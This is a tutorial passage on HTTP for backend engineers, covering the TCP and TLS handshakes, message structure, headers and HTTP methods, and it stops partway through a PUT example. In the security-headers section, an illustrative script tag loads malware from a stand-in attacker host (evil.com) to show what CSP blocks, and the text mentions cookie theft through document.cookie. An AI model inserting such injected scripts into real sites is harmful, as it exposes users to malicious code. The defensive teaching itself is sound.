# HTTP for Backend Engineers - Part 1: Basics

## Table of Contents
1. [Backend Systems Overview](#1-backend-systems-overview)
2. [HTTP Protocol Basics](#2-http-protocol-basics)
3. [TCP Connection](#3-tcp-connection)
4. [HTTPS and Security](#4-https-and-security)
5. [HTTP Message Structure](#5-http-message-structure)
6. [HTTP Headers](#6-http-headers)

---

## 1. Backend Systems Overview

### Definition
Backend systems are server-side applications that process client requests, manage data, and send responses.

### Theory
When you use a website or app, the backend handles all processing behind the scenes - database operations, business logic, authentication, and data management.

### Technical Terms
- **Client**: Application making requests (browser, mobile app)
- **Server**: System that processes requests and sends responses
- **Request**: Message from client asking for data/action
- **Response**: Message from server with data/confirmation
- **Firewall**: Security layer filtering requests
- **Proxy**: Intermediate server (like Nginx)
- **Backend Server**: Application server (Spring Boot, Node.js)
- **Database**: Where data is stored

### Real-World Example
**Ordering food on Swiggy:**
- You (Client) open app and order biryani
- App sends order to Swiggy servers
- Firewall checks if request is safe
- Nginx routes to correct service
- Spring Boot processes order, checks restaurant, calculates price
- Database stores order
- Response: "Order confirmed! 30 mins"

### Complete Flow
```
USER types URL: www.facebook.com
    ↓
DNS LOOKUP
"What is IP of facebook.com?"
DNS: "157.240.22.35"
    ↓
TCP CONNECTION (3-way handshake)
SYN → SYN-ACK → ACK
✓ Connection established
    ↓
TLS HANDSHAKE (if HTTPS)
Exchange certificates
Setup encryption
✓ Secure connection
    ↓
HTTP REQUEST
"GET /home HTTP/1.1"
    ↓
FIREWALL
"Is this safe? ✓ Yes"
    ↓
PROXY (Nginx)
"Route to correct server"
    ↓
BACKEND SERVER (Spring Boot)
- Check authentication
- Query database
- Apply business logic
- Generate response
    ↓
HTTP RESPONSE
"200 OK + Data"
    ↓
BROWSER
Render and display page
```

---

## 2. HTTP Protocol Basics

### Definition
HTTP (HyperText Transfer Protocol) is a set of rules defining how clients and servers communicate.

### Theory
HTTP is the foundation of the web - a standard protocol that browsers and servers follow to exchange information. Without HTTP, different systems couldn't talk to each other.

### Two Core Principles

#### Principle 1: Statelessness

**Definition**: HTTP has no memory - each request is independent.

**Theory**
The server doesn't remember previous requests. Every request must include all necessary information (authentication, data, etc.). After responding, the server forgets everything.

**Technical Terms**
- **Stateless**: No memory between requests
- **Self-contained**: Each request has complete information
- **Independent**: Requests don't depend on previous ones

**Why Important?**
Since server has no memory, we use:
- **Cookies**: Small data stored in browser
- **Sessions**: Server-side storage with session ID
- **Tokens**: JWT (JSON Web Tokens) for authentication

**Example**
```
Request 1:
Browser: "Show me profile page"
Server: "Who are you? Don't know you!"
Browser: "Here's my token: abc123"
Server: "Verified! Here's your profile"
[Server forgets after response]

Request 2 (1 minute later):
Browser: "Show my messages"
Server: "Who are you?" (no memory!)
Browser: "Token: abc123" (must send again)
Server: "Verified! Here's messages"
```

**Real-World Analogy**
Like talking to someone with complete amnesia:
- You: "Hi, I'm Rahul, I want to buy a shirt"
- Shopkeeper: "OK, here's catalog"
- You: "Hi, I'm Rahul, I want this blue shirt" (reintroduce!)
- Shopkeeper: "OK, here's price"

**Benefits**
1. **Simplicity**: Server doesn't store session data for millions of users
2. **Scalability**: Request can go to any server
3. **Reliability**: If server crashes, no data lost

---

#### Principle 2: Client-Server Model

**Definition**: Communication always started by client, server only responds.

**Theory**
Client initiates conversation, server waits and responds. Server never sends unsolicited messages (in standard HTTP).

**Roles**

**Client Responsibilities:**
- Initiate requests
- Provide URL
- Provide headers (metadata)
- Provide body data (if needed)
- Wait for response

**Server Responsibilities:**
- Wait for requests
- Process requests
- Access databases
- Apply business logic
- Generate and send responses

**Technical Terms**
- **Request-Response Cycle**: One complete round
- **Initiator**: Who starts (always client)
- **Responder**: Who replies (always server)

**Example**
```
Instagram App:

Client: "GET /api/feed - Give me posts"
Server: "Here are 20 posts"

Client: "POST /api/like/post123 - I liked this"
Server: "Like added successfully"

Server CANNOT say:
"Hey client, new notification!" (without client asking)

For real-time: Use WebSockets or polling
```

**Real-World Analogy**
Customer service call:
- You call customer care (initiate)
- Agent picks up and waits
- You: "What's my balance?"
- Agent: "Balance is ₹5000"
- You: "Transfer ₹1000"
- Agent: "Transfer done"

Agent never calls you randomly!

---

### HTTP vs HTTPS

**HTTP (Plain)**
- **Definition**: Original protocol without encryption
- **Port**: 80
- **Security**: None - plain text
- **Use**: Insecure, anyone can read data

**HTTPS (Secure)**
- **Definition**: HTTP with TLS/SSL encryption
- **Port**: 443
- **Security**: Encrypted
- **Use**: Secure, only sender/receiver can read

**Comparison Example**
```
Sending password via HTTP:
Browser → Internet → Server
Password: "mypass123" (visible to anyone!)

Hacker sees: "mypass123" ❌

---

Sending via HTTPS:
Browser → [ENCRYPTED] → Server
Encrypted: "8k3#mF9@xL2$"

Hacker sees: "8k3#mF9@xL2$" (meaningless!) ✓
```

**Real-World Analogy**
- **HTTP**: Postcard - anyone handling it can read
- **HTTPS**: Sealed envelope - only recipient can open

---

## 3. TCP Connection

### Definition
TCP (Transmission Control Protocol) provides reliable, ordered data delivery between applications.

### Theory
Before HTTP communication, TCP connection must be established. TCP ensures data arrives in correct order and retransmits lost packets.

Think:
- **TCP**: Road/highway (data travels on)
- **HTTP**: Car/vehicle (carries actual data)

### Technical Terms
- **TCP**: Transmission Control Protocol
- **Reliable**: Guarantees data delivery
- **Ordered**: Data arrives in sequence
- **Connection-oriented**: Connection before data transfer
- **Port**: Number identifying application (HTTP=80, HTTPS=443)
- **Socket**: IP address + port (192.168.1.1:80)

### 3-Way Handshake

**Definition**: Three-step process to establish TCP connection.

**Theory**
Before exchanging data, client and server must agree to communicate and synchronize. Like a formal greeting before conversation.

**Step 1: SYN (Synchronize)**

**What happens**: Client sends SYN packet.

**Technical Details**
```
Browser → Server
- SYN flag = 1 (connection request)
- Sequence number = 1000 (random starting number)
- Source port = 54321 (browser's port)
- Destination port = 443 (server's HTTPS port)
```

**Meaning**: "Hello Server! I want to connect. My sequence starts at 1000."

---

**Step 2: SYN-ACK (Synchronize-Acknowledge)**

**What happens**: Server responds with SYN-ACK.

**Technical Details**
```
Server → Browser
- SYN flag = 1 (I'm ready too)
- ACK flag = 1 (received your SYN)
- Sequence number = 5000 (server's starting number)
- Acknowledgment = 1001 (client's number + 1)
```

**Meaning**: "Hello! I received your request. I'm ready. My sequence starts at 5000."

---

**Step 3: ACK (Acknowledge)**

**What happens**: Client sends final ACK.

**Technical Details**
```
Browser → Server
- ACK flag = 1 (confirmed)
- Acknowledgment = 5001 (server's number + 1)
```

**Meaning**: "Perfect! Connection established. Let's transfer data!"

---

**Complete Visual Flow**
```
CLIENT                      SERVER
  |                            |
  | SYN (seq=1000)            |
  |-------------------------→ |
  | "I want to connect"       |
  |                           |
  | SYN-ACK (seq=5000,        |
  |         ack=1001)         |
  | ←-------------------------|
  | "I'm ready, acknowledged" |
  |                           |
  | ACK (ack=5001)            |
  |-------------------------→ |
  | "Perfect, let's begin"    |
  |                           |
  | ✓ CONNECTION ESTABLISHED  |
  |                           |
  | Data Transfer             |
  |==========================|
```

**Real-World Analogies**

**Phone Call:**
1. You dial (SYN) - "Ring ring..."
2. Friend picks up (SYN-ACK) - "Hello?"
3. You respond (ACK) - "Hi, it's Rahul"
4. Conversation starts (data transfer)

**Job Interview:**
1. You arrive (SYN) - "Hello, I'm here for interview"
2. Receptionist (SYN-ACK) - "Welcome! Please sit"
3. You sit (ACK) - "Thank you"
4. Interview begins (data transfer)

**Why 3-Way Handshake?**

1. **Confirm both sides ready**
   - Client ready to send
   - Server ready to receive
   - Both acknowledge each other

2. **Synchronize sequence numbers**
   - Both agree on starting numbers
   - Track packets and maintain order

3. **Detect lost packets**
   - If SYN lost, client resends
   - If SYN-ACK lost, server resends
   - Ensures reliable connection

**After Connection**
```
HTTP can now work:

Browser → Server:
GET /home HTTP/1.1
Host: facebook.com

Server → Browser:
HTTP/1.1 200 OK
Content-Type: text/html
[HTML data]
```

---

## 4. HTTPS and Security

### TLS/SSL Handshake

**Definition**: Process of establishing encrypted connection.

**Theory**
After TCP connection, if site uses HTTPS, TLS handshake occurs. This sets up encryption so all data is unreadable to anyone in the middle.

### Technical Terms
- **SSL**: Secure Sockets Layer (older, deprecated)
- **TLS**: Transport Layer Security (modern, secure)
- **Encryption**: Converting data to unreadable format
- **Decryption**: Converting back to readable
- **Certificate**: Digital document proving server identity
- **Public Key**: Used to encrypt (anyone can have)
- **Private Key**: Used to decrypt (only server has)
- **Certificate Authority (CA)**: Trusted organization issuing certificates

### TLS Handshake Steps

**Step 1: Client Hello**
```
Browser → Server:
"Hello! I want HTTPS.
I support TLS 1.3
I can use these encryptions: AES, RSA..."
```

**Step 2: Server Hello + Certificate**
```
Server → Browser:
"Hello! Let's use TLS 1.3
We'll use AES encryption

Here's my SSL Certificate:
- Domain: facebook.com
- Owner: Meta Platforms Inc.
- Valid until: Dec 31, 2026
- Issued by: DigiCert (CA)
- Public Key: [key data]"
```

**Step 3: Certificate Verification**
```
Browser checks:
✓ Certificate expired? No
✓ Issued by trusted CA? Yes (DigiCert)
✓ Domain matches? Yes (facebook.com)
✓ Certificate revoked? No

Result: Certificate VALID ✓
```

**Step 4: Key Exchange**
```
Browser:
1. Generates random secret key: "abc123xyz"
2. Encrypts key using server's public key
3. Sends encrypted key

Server:
1. Receives encrypted key
2. Decrypts using private key
3. Now both have same secret key!

✓ Symmetric encryption established
```

**Step 5: Encrypted Communication**
```
Browser → Server (encrypted):
Plain: "GET /profile"
Encrypted: "k3#8f@2dx9..."

Server → Browser (encrypted):
Plain: "Here's data"
Encrypted: "p9@xL2#mF3..."

No one in middle can read! 🔒
```

**Visual Flow**
```
CLIENT                          SERVER
  |                               |
  | Client Hello                  |
  |----------------------------→ |
  |                               |
  | ←-----------------------------|
  | Server Hello + Certificate    |
  | + Public Key                  |
  |                               |
  | Verify Certificate            |
  | ✓ Valid                       |
  |                               |
  | Generate Secret Key           |
  | Encrypt with Public Key       |
  |----------------------------→ |
  | [Encrypted Secret Key]        |
  |                               |
  |                        Decrypt|
  |                   with Private|
  |                            Key|
  |                               |
  | ✓ BOTH HAVE SECRET KEY       |
  |                               |
  |==============================|
  | All data encrypted with       |
  | symmetric key                 |
  |==============================|
```

---

### SSL Certificate

**Definition**: Digital document proving website identity.

**Theory**
Like Aadhaar card or passport proves your identity, SSL certificate proves website is who it claims to be.

**What Certificate Contains**
```
SSL Certificate for facebook.com:

Domain Name: facebook.com
Owner: Meta Platforms, Inc.
Address: 1 Hacker Way, Menlo Park, CA
Valid From: Jan 1, 2026
Valid Until: Dec 31, 2026
Public Key: [long string]
Certificate Authority: DigiCert Inc.
CA Signature: [digital signature]
```

**Real-World Analogy**

**Driving License:**
```
Name: Rahul Kumar
DOB: Jan 1, 2000
License #: DL-1234567890
Valid Until: Dec 31, 2030
Issued By: RTO Delhi (Trusted)
Photo + Signature
```
Proves you're Rahul and authorized to drive.

**SSL Certificate:**
```
Domain: facebook.com
Owner: Meta Inc.
Valid Until: Dec 31, 2026
Issued By: DigiCert (Trusted CA)
Public Key + Signature
```
Proves website is really facebook.com, not fake.

---

### Certificate Authority (CA)

**Definition**: Trusted organizations that verify and issue SSL certificates.

**Theory**
Like government issues Aadhaar after verifying identity, CAs verify websites and issue certificates.

**Popular CAs**
- DigiCert
- Let's Encrypt (Free!)
- GlobalSign
- Comodo
- GoDaddy

**Example Process**
```
Meta (Facebook) wants certificate:

Step 1: Apply to DigiCert
"We own facebook.com, need certificate"

Step 2: DigiCert verifies
- Really own facebook.com? ✓
- Legitimate company? ✓
- DNS records verified? ✓

Step 3: DigiCert issues
"Here's certificate, valid 1 year"

Step 4: Browsers trust it
Browser has list of trusted CAs (includes DigiCert)
"DigiCert signed this, I trust it" ✓
```

---

### Public Key and Private Key

**Definition**: Pair of cryptographic keys for encryption/decryption.

**Theory**
Public key = lock (anyone can use to lock)
Private key = only key that can unlock

**How It Works**

**Lock and Key Analogy**
```
Server's Public Key = Lock (everyone gets copy)
Server's Private Key = Only key that opens lock

Browser:
1. Gets server's public key (lock)
2. Puts message in box
3. Locks box with public key
4. Sends locked box

Server:
1. Receives locked box
2. Uses private key to unlock
3. Reads message

Anyone in middle:
- Has locked box
- Has public key (lock)
- But CANNOT open! (no private key)
```

**Real Example**
```
Sending password "mypass123":

Step 1: Get server's public key
Public Key: "PUB-KEY-XYZ123"

Step 2: Encrypt password
Original: "mypass123"
Encrypted: "8k3#mF9@xL2$..."

Step 3: Send encrypted data
Browser → Internet → Server
Traveling: "8k3#mF9@xL2$..."

Hacker intercepts: "8k3#mF9@xL2$..."
Hacker tries decrypt: ❌ No private key!

Step 4: Server decrypts
Private Key: "PRIV-KEY-ABC789"
Decrypted: "mypass123" ✓
```

**Why Use Both Asymmetric and Symmetric?**

```
Asymmetric Encryption:
✓ Very secure
✗ Very SLOW (complex math)

Symmetric Encryption:
✓ Very fast
✗ How to share secret key securely?

Solution - Use Both:

Phase 1 (Handshake): Asymmetric
- Use public/private keys
- Securely exchange symmetric key
- Slow but only once

Phase 2 (Data): Symmetric
- Use shared symmetric key
- Encrypt all data
- Fast and secure!
```

---

## 5. HTTP Message Structure

### HTTP Request Structure

**Definition**: Format in which client sends data to server.

**Theory**
Every HTTP request follows specific structure. This standard ensures any server can understand requests from any client.

**Complete Structure**
```
[REQUEST LINE]
[HEADERS]
[BLANK LINE]
[BODY - optional]
```

**Raw Example**
```
POST /api/users HTTP/1.1
Host: api.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0)
Content-Type: application/json
Content-Length: 52
Authorization: Bearer abc123

{"name":"Rahul","email":"rahul@gmail.com","age":25}
```

**Part 1: Request Line**

**Format**: `METHOD PATH VERSION`

**Example**: `POST /api/users HTTP/1.1`

**Parts**:
- **POST**: HTTP method (what to do)
- **/api/users**: Path (where)
- **HTTP/1.1**: Protocol version

**Real-World Analogy**
```
Courier Form:

Service: EXPRESS DELIVERY (Method)
Destination: Rahul's House, A-123 (Path)
Version: BlueDart 2.0 (Version)
```

---

**Part 2: Headers**

**Definition**: Key-value pairs with additional info.

**Format**: `Key: Value`

**Example**
```
Host: api.example.com
User-Agent: Mozilla/5.0
Content-Type: application/json
Authorization: Bearer token123
```

**Real-World Analogy**
```
Package Info (written outside):

Sender: Amit (User-Agent)
Recipient: Rahul (Host)
Type: Fragile (Content-Type)
ID: Aadhaar 1234 (Authorization)
Weight: 2 kg (Content-Length)
```
Info outside helps without opening package!

---

**Part 3: Blank Line**

**Purpose**: Separates headers from body.

**Technical**: Line with just `\r\n`

---

**Part 4: Body (Optional)**

**When present**:
- POST (creating)
- PUT (updating all)
- PATCH (updating partial)

**When absent**:
- GET (just fetching)
- DELETE (just deleting)

**Examples**
```
JSON Body:
{"name": "Rahul", "email": "rahul@gmail.com"}

Form Data:
name=Rahul&email=rahul@gmail.com

File Upload:
[binary file data]
```

---

### HTTP Response Structure

**Complete Structure**
```
[STATUS LINE]
[HEADERS]
[BLANK LINE]
[BODY]
```

**Raw Example**
```
HTTP/1.1 200 OK
Date: Sun, 08 Feb 2026 10:30:00 GMT
Server: nginx/1.18.0
Content-Type: application/json
Content-Length: 85
Set-Cookie: sessionId=xyz789

{"id":123,"name":"Rahul","email":"rahul@gmail.com"}
```

**Part 1: Status Line**

**Format**: `VERSION CODE TEXT`

**Example**: `HTTP/1.1 200 OK`

**Parts**:
- **HTTP/1.1**: Version
- **200**: Status code
- **OK**: Status text

**Examples**
```
HTTP/1.1 200 OK (Success)
HTTP/1.1 404 Not Found (Not found)
HTTP/1.1 500 Internal Server Error (Server error)
```

---

**Part 2: Response Headers**

**Example**
```
Content-Type: application/json (format)
Content-Length: 85 (size)
Set-Cookie: session=abc (store cookie)
Cache-Control: max-age=3600 (cache 1 hour)
```

---

**Part 3: Blank Line**

Separator between headers and body.

---

**Part 4: Response Body**

**Examples**

**JSON**:
```json
{
  "id": 123,
  "name": "Rahul",
  "email": "rahul@gmail.com"
}
```

**HTML**:
```html
<!DOCTYPE html>
<html>
<body><h1>Hello!</h1></body>
</html>
```

**Image**: `[binary image data]`

---

### Complete Request-Response Example

**Scenario**: Login to Facebook

**REQUEST**
```
POST /api/login HTTP/1.1
Host: facebook.com
User-Agent: Chrome/100.0
Content-Type: application/json
Content-Length: 58

{"email":"rahul@gmail.com","password":"mypass123"}
```

**RESPONSE**
```
HTTP/1.1 200 OK
Date: Sun, 08 Feb 2026 10:30:00 GMT
Content-Type: application/json
Set-Cookie: sessionId=xyz789; HttpOnly; Secure
Content-Length: 120

{"success":true,"user":{"id":123,"name":"Rahul"}}
```

**What Happened**:
1. Browser sent POST with email/password
2. Server verified credentials
3. Server created session, sent cookie
4. Server responded with success + user data
5. Browser stored cookie for future requests

---

## 6. HTTP Headers

### What Are Headers?

**Definition**: Metadata (information about data) sent with HTTP messages.

**Theory**
Headers are like labels on a package - they provide important information without opening the package. Both client and server use headers to communicate extra details.

**Format**: `HeaderName: HeaderValue`

**Real-World Analogy**

**Courier Package**:
```
OUTSIDE (Headers):
- Sender: Amit
- Recipient: Rahul
- Address: Mumbai 400001
- Fragile: Yes
- Weight: 2 kg

INSIDE (Body):
- Actual gift
```

**Why Important?**
1. Don't need to open to know details
2. Intermediate systems can process without reading body
3. Standard way to communicate metadata

---

### Types of Headers

#### 1. REQUEST HEADERS

**Definition**: Headers sent by client to server.

**Purpose**: Tell server about client's capabilities and preferences.

---

**A) Host**

**Definition**: Domain name of server.

**Format**: `Host: domain.com`

**Why needed**: One server can host multiple websites.

**Example**
```
GET /home HTTP/1.1
Host: instagram.com

Server knows: "Request for Instagram"
```

**Scenario**
```
Server IP: 157.240.22.35

This IP hosts:
- facebook.com
- instagram.com
- whatsapp.com

Request with Host: instagram.com
Server: "Route to Instagram ✓"
```

---

**B) User-Agent**

**Definition**: Identifies client (browser, OS, device).

**Format**: `User-Agent: Application/Version (Platform)`

**Why needed**: Server customizes response for different devices.

**Example**
```
User-Agent: Mozilla/5.0 (Windows NT 10.0) Chrome/100

Breakdown:
- Windows 10
- 64-bit
- Chrome 100
```

**Use Case**
```
Mobile:
User-Agent: iPhone iOS 15

Server sends:
- Mobile HTML
- Smaller images
- Touch interface

Desktop:
User-Agent: Windows Chrome

Server sends:
- Full desktop HTML
- High-res images
- Mouse interface
```

---

**C) Accept**

**Definition**: Tells what content types client can understand.

**Format**: `Accept: content-type`

**Examples**
```
Accept: application/json (want JSON)
Accept: text/html (want HTML)
Accept: image/png (want PNG)
Accept: */* (accept anything)
```

**Content Negotiation**
```
REQUEST 1:
Accept: application/json

RESPONSE:
Content-Type: application/json
{"id": 123, "name": "Rahul"}

---

REQUEST 2:
Accept: application/xml

RESPONSE:
Content-Type: application/xml
<user><id>123</id></user>
```

---

**D) Accept-Language**

**Definition**: Preferred language for response.

**Format**: `Accept-Language: language-code`

**Examples**
```
Accept-Language: hi-IN (Hindi - India)
Accept-Language: en-US (English - US)
Accept-Language: hi-IN, en-US (Hindi preferred)
```

**Example**
```
REQUEST:
Accept-Language: hi-IN

RESPONSE:
{"message": "नमस्ते!"}

---

REQUEST:
Accept-Language: en-US

RESPONSE:
{"message": "Hello!"}
```

---

**E) Accept-Encoding**

**Definition**: Compression formats client supports.

**Format**: `Accept-Encoding: algorithms`

**Examples**
```
Accept-Encoding: gzip
Accept-Encoding: gzip, deflate, br
```

**Example**
```
REQUEST:
Accept-Encoding: gzip

RESPONSE:
Content-Encoding: gzip
Content-Length: 3800 (compressed)

Original: 26 MB
Compressed: 3.8 MB
Saved: 85%! ✓
```

---

**F) Authorization**

**Definition**: Credentials to authenticate.

**Format**: `Authorization: Type credentials`

**Types**

**Bearer Token (JWT)**:
```
Authorization: Bearer eyJhbGc...
Most common in modern APIs
```

**Basic Auth**:
```
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
Format: Base64(username:password)
```

**API Key**:
```
Authorization: ApiKey sk_live_51H8...
```

**Example**
```
Without Authorization:
GET /api/profile

RESPONSE:
401 Unauthorized
{"error": "Login required"}

---

With Authorization:
GET /api/profile
Authorization: Bearer token123

RESPONSE:
200 OK
{"name": "Rahul"}
```

---

**G) Cookie**

**Definition**: Previously stored cookies sent to server.

**Format**: `Cookie: name=value; name2=value2`

**Example**
```
Cookie: sessionId=abc123; userId=456
```

**Flow**
```
Login:
POST /api/login

Response:
Set-Cookie: sessionId=abc123

Browser stores ✓

Later:
GET /api/profile
Cookie: sessionId=abc123

Server: "Session valid ✓"
```

---

**H) Referer**

**Definition**: URL of previous page.

**Format**: `Referer: https://previous-page.com`

**Example**
```
User searches "instagram" on Google
Clicks result

Request to Instagram:
Referer: https://google.com/search?q=instagram

Instagram: "User came from Google search"
(Analytics tracking)
```

---

**I) Content-Type** (in requests)

**Definition**: Format of request body.

**Examples**

**JSON**:
```
Content-Type: application/json
{"name": "Rahul"}
```

**Form**:
```
Content-Type: application/x-www-form-urlencoded
name=Rahul&email=rahul@gmail.com
```

**File Upload**:
```
Content-Type: multipart/form-data
[binary file data]
```

---

**J) Content-Length**

**Definition**: Size of body in bytes.

**Example**
```
POST /api/users
Content-Type: application/json
Content-Length: 52

{"name":"Rahul","email":"rahul@gmail.com"}

Server: "Read 52 bytes"
```

---

#### 2. RESPONSE HEADERS

**Definition**: Headers sent by server to client.

---

**A) Content-Type** (in response)

**Definition**: Format of response body.

**Examples**
```
Content-Type: application/json (JSON)
Content-Type: text/html (HTML)
Content-Type: image/png (PNG)
Content-Type: application/pdf (PDF)
Content-Type: video/mp4 (Video)
```

---

**B) Set-Cookie**

**Definition**: Instruct browser to store cookies.

**Format**: `Set-Cookie: name=value; attributes`

**Attributes**:
- **Path**: Where valid (`Path=/`)
- **Max-Age**: Validity in seconds
- **HttpOnly**: Not accessible via JavaScript
- **Secure**: Only over HTTPS
- **SameSite**: CSRF protection

**Example**
```
Set-Cookie: sessionId=abc123; Path=/; HttpOnly; Secure; Max-Age=86400

Browser stores for 24 hours
```

**Security**
```
Without HttpOnly:
Set-Cookie: sessionId=abc123

JavaScript:
document.cookie (Can steal! ❌)

---

With HttpOnly:
Set-Cookie: sessionId=abc123; HttpOnly

JavaScript:
document.cookie (Cannot access ✓)
```

---

**C) Cache-Control**

**Definition**: Caching rules.

**Directives**

**max-age**:
```
Cache-Control: max-age=3600
Cache for 1 hour
```

**no-cache**:
```
Cache-Control: no-cache
Cache but validate first
```

**no-store**:
```
Cache-Control: no-store
Don't cache (sensitive data)
```

**public**:
```
Cache-Control: public, max-age=86400
Anyone can cache (CDN, proxy)
```

**private**:
```
Cache-Control: private, max-age=3600
Only browser caches
```

---

**D) ETag**

**Definition**: Unique identifier for resource version (hash).

**Format**: `ETag: "hash-value"`

**Flow**
```
First Request:
ETag: "abc123"
{"data": "Hello"}

Browser caches ✓

Later (cache expired):
If-None-Match: "abc123"

If unchanged:
304 Not Modified (use cache)

If changed:
200 OK
ETag: "xyz789"
{"data": "Updated"}
```

---

**E) Server**

**Definition**: Server software name.

**Examples**
```
Server: nginx/1.18.0
Server: Apache/2.4.41
Server: cloudflare
```

---

#### 3. SECURITY HEADERS

**Purpose**: Protect against attacks.

---

**A) Strict-Transport-Security (HSTS)**

**Definition**: Force HTTPS.

**Format**: `Strict-Transport-Security: max-age=seconds`

**Example**
```
Strict-Transport-Security: max-age=31536000

Browser remembers 1 year:
"Always use HTTPS"

User types: http://facebook.com
Browser auto-converts: https://facebook.com
```

---

**B) Content-Security-Policy (CSP)**

**Definition**: Control resource loading.

**Example**
```
Content-Security-Policy: default-src 'self'

Only load from own domain

Attacker injects:
<script src="https://evil.com/malware.js"></script>

Browser: "BLOCKED! Not allowed" ✓
```

---

**C) X-Frame-Options**

**Definition**: Control iframe loading.

**Values**:
```
X-Frame-Options: DENY (no iframes)
X-Frame-Options: SAMEORIGIN (same domain only)
```

**Prevents clickjacking** ✓

---

**D) X-Content-Type-Options**

**Definition**: Prevent MIME sniffing.

**Example**
```
X-Content-Type-Options: nosniff
Content-Type: image/jpeg

Browser: "Treat as image only, don't execute"
(Prevents XSS) ✓
```

---
# HTTP for Backend Engineers - Part 2: Methods, Status Codes & CORS

## Table of Contents
1. [HTTP Methods](#1-http-methods)
2. [HTTP Status Codes](#2-http-status-codes)
3. [CORS & Pre-flight Requests](#3-cors--pre-flight-requests)

---

## 1. HTTP Methods

### What Are HTTP Methods?

**Definition**: HTTP methods define the action to be performed on a resource.

**Theory**
Methods tell server what you want to do. Like bank operations (check balance, deposit, withdraw), HTTP has different methods for different actions.

**Technical Terms**
- **Method**: Type of action (GET, POST, PUT, PATCH, DELETE)
- **Resource**: Data/object being acted upon
- **Idempotent**: Same result no matter how many times called
- **Safe**: Doesn't modify server state

### Properties

**Safe**: Method doesn't change server (only reads)
**Idempotent**: Multiple calls = same result
**Cacheable**: Response can be cached

---

### GET Method

**Definition**: Retrieve/fetch data from server.

**Purpose**: Read operation.

**Characteristics**
```
✓ Safe (doesn't modify)
✓ Idempotent (same result always)
✓ Cacheable
✗ No body
✓ Visible in URL
```

**When to Use**
- Fetching data
- Reading resources
- Search/filter
- Pagination

**Syntax**
```
GET /path?param1=value1&param2=value2 HTTP/1.1
```

**Example 1: Get user profile**
```
REQUEST:
GET /api/users/123 HTTP/1.1
Host: api.facebook.com
Accept: application/json

RESPONSE:
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 123,
  "name": "Rahul Kumar",
  "email": "rahul@gmail.com",
  "followers": 1500
}
```

**Example 2: Search products**
```
REQUEST:
GET /api/products?category=electronics&price<1000 HTTP/1.1

RESPONSE:
{
  "total": 45,
  "products": [
    {"id": 1, "name": "Headphones", "price": 799},
    {"id": 2, "name": "Mouse", "price": 499}
  ]
}
```

**Why Safe**
```
Call 1: GET /api/users/123
Response: {name: "Rahul", followers: 100}

Call 2: GET /api/users/123
Response: {name: "Rahul", followers: 100}

Server unchanged ✓
```

**Why Idempotent**
```
GET /api/users/123 (100 times)
Same response every time ✓
```

**When NOT to Use**
```
❌ Sending passwords
   GET /login?password=12345 (visible in URL!)

❌ Creating data
   GET /createUser?name=Rahul (use POST)

❌ Deleting data
   GET /deleteUser?id=123 (use DELETE)

❌ Large data
   GET /search?data=[huge] (URL limit ~2000 chars)
```

**Real-World Analogy**
```
Library:
GET = Reading a book
- Doesn't change book
- Can read multiple times
- Same content always
```

---

### POST Method

**Definition**: Create new resource.

**Purpose**: Submit data to create something new.

**Characteristics**
```
✗ NOT Safe (modifies server)
✗ NOT Idempotent (creates new each time)
✗ NOT Cacheable
✓ Has body
✗ NOT Visible in URL
```

**When to Use**
- Creating resources
- User registration
- Login
- Form submissions
- File uploads

**Syntax**
```
POST /path HTTP/1.1
Content-Type: application/json

{data}
```

**Example 1: Create user**
```
REQUEST:
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "name": "Rahul Kumar",
  "email": "rahul@gmail.com",
  "password": "securepass123"
}

RESPONSE:
HTTP/1.1 201 Created
Location: /api/users/124

{
  "id": 124,
  "name": "Rahul Kumar",
  "created_at": "2026-02-08T10:30:00Z"
}
```

**Example 2: Instagram post**
```
REQUEST:
POST /api/posts HTTP/1.1
Content-Type: application/json

{
  "caption": "Beautiful sunset 🌅",
  "imageUrl": "https://cdn.insta.com/img123.jpg",
  "userId": 123
}

RESPONSE:
HTTP/1.1 201 Created

{
  "postId": 9876,
  "caption": "Beautiful sunset 🌅",
  "likes": 0,
  "createdAt": "2026-02-08T15:30:00Z"
}
```

**Example 3: Login**
```
REQUEST:
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "email": "rahul@gmail.com",
  "password": "mypass123"
}

RESPONSE:
HTTP/1.1 200 OK
Set-Cookie: sessionId=xyz789

{
  "success": true,
  "token": "eyJhbGc...",
  "user": {"id": 123, "name": "Rahul"}
}
```

**Why NOT Idempotent**
```
POST /api/users (1st time)
{"name": "Rahul"}
Response: User created with ID 1

POST /api/users (2nd time - SAME data)
{"name": "Rahul"}
Response: User created with ID 2

Different results! NOT idempotent ❌
Two users created!
```

**Duplicate Problem**
```
User clicks "Place Order" on Amazon:
POST /api/orders {"productId": 123}
Response: Order placed!

Network glitch, clicks again:
POST /api/orders {"productId": 123}
Response: Order placed!

Problem: 2 orders! 😱

Solutions:
- Disable button after click
- Use idempotency keys
- Check duplicates on server
```

**Real-World Analogy**
```
Post Office:
POST = Sending new letter
- Each letter is different
- Creates new record
- Can send duplicates
```

---

### PUT Method

**Definition**: Replace entire resource.

**Purpose**: Complete replacement.

**Characteristics**
```
✗ NOT Safe (modifies)
✓ Idempotent (same result)
✗ NOT Cacheable
✓ Has body (complete data)
```

**When to Use**
- Complete update
- Replace all fields
- Have full resource data

**Syntax**
```
PUT /resource/id HTTP/1.1
Content-Type: application/json

{all fields}
```

**Example: Update user (complete)**
```
EXISTING:
{
  "id": 123,
  "name": "Rahul Kumar",
  "email": "rahul@gmail.com",
  "age": 25,
  "city": "Mumbai"
}

REQUEST:
PUT /api/users/123 HTTP/1.1

{
  "name": "Rahul Sharma",
  "email": "rahul.new@gmail.com",
  "age": 26,
  "city": "Delhi"
}

RESPONSE:
{
  "id": 123,
  "name": "Rahul Sharma",      ← Updated
  "email": "rahul.new@gmail.com", ← Updated
  "age": 26,                    ← Updated
  "city": "Delhi"               ← Updated
}

All fields replaced!
```

**Danger: Missing Fields**
```
EXISTING:
{
  "name": "Rahul",
  "email": "rahul@gmail.com",
  "age": 25,
  "city": "Mumbai"
}

WRONG PUT (missing fields):
PUT /api/users/123
{
  "name": "Rahul Kumar",
  "email": "new@gmail.com"
}

RESULT:
{
  "name": "Rahul Kumar",
  "email": "new@gmail.com",
  "age": null,     ← LOST! ❌
  "city": null     ← LOST! ❌
}

Data loss! PUT needs ALL fields!
```

**Why Idempotent**
```
PUT /api/users/123 (1st time)
{"name": "Rahul", "email": "rahul@gmail.com"}
